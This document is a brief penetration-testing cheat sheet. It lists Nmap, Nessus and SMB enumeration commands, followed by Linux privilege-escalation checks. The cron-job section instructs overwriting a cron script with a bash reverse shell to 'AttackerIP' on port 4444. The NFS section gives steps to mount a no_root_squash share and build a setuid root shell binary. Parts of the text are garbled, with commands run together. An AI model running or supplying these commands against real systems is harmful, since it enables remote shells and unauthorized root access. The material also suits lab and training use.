
# Nmap

To check all ports

```
nmap -A -p- TARGET-IP
```

To check specific port

```
nmap -p 80 TARGET-IP
```

Github:
https://github.com/Lifka/hacking-resources/blob/main/nmap-cheat-sheet.md
https://www.stationx.net/nmap-cheat-sheet/

# Nessus

in terminal

```
service nessusd start
```

open in browser

```
https://localhost:8834
```

# SMB

SMB Enumration

```
smbclient -L //10.10.10.192
// OR
sudo nmap -p 445 --script smb-enum-shares 192.168.1.58
```

to catch shares

```
crackmapexec smb 10.10.10.192 --shares
// OR nmap module
```


# Linux Privilege Escalation

## Kernel 

Scan kernel version, then search for exploit

```
uname -a
```

## Sudo 

run this command, then check GTFObins for exploitation

```
sudo -l
```

## SUID 

run this command, then check GTFObins for exploitation

```
find / -type f -perm -04000 -ls 2>/dev/null
```

## Cron-Jobs 

Check this path for edit a file

```
/etc/crontab
```

then modify it to this!

```
#!/bin/bash bash -I >& /dev/tcp/AttackerIP/4444 0>&1
```

## Capabilities 

run this command, then check GTFObins for exploitation

```
getcap -r / 2>/dev/null
```

## NFS

Check for "No_root_squash" flag output in this file

```
cat /etc/exports
```

then exploit!

```
showmount -e MACHINE_IP 
mkdir /tmp/1 
mount -o rw,vers=2 MACHINE_IP:/tmp /tmp/1 In command prompt type: echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c 
gcc /tmp/1/x.c -o /tmp/1/x 
chmod +s /tmp/1/x
```


# Windows Privilege Escalation

Try this command

```
getsys
```

